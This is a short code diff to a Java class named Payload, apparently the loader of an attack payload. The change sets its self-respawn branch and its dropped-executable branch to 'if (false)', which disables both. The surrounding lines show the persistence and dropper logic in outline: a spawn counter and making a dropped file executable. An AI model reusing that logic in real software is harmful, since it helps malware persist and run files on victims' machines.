@@ -92,7 +92,7 @@ public class Payload extends ClassLoader {
         // check if we should respawn
         int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
         String droppedExecutable = props.getProperty("DroppedExecutable");
-        if (spawn > 0) {
+        if (false) {
             // decrease count so that eventually the process
             // will stop spawning
             props.setProperty("Spawn", String.valueOf(spawn - 1));
@@ -143,7 +143,7 @@ public class Payload extends ClassLoader {
                     Thread.sleep(100);
                 }
             }
-        } else if (droppedExecutable != null) {
+        } else if (false) {
             File droppedFile = new File(droppedExecutable);
             // File.setExecutable is Java 1.6+, therefore call it via reflection and try
             // the chmod alternative if it fails. Do not call it at all for Windows.
